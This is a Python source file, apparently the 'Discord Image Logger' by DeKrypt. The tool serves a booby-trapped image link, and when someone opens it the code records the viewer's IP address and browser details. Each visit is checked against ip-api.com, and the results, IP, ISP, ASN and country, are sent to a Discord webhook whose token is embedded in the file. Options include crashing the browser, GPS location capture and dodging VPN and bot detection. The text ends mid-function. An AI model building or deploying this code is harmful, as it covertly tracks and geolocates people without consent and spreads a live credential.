# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1339624888629071914/Q-hpMHOxIFw5gFh4bP7IvNjrErxQ5woIV_vbOgBtruimJAqnc2cjusxoxNrbuTKNQ7Rg",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
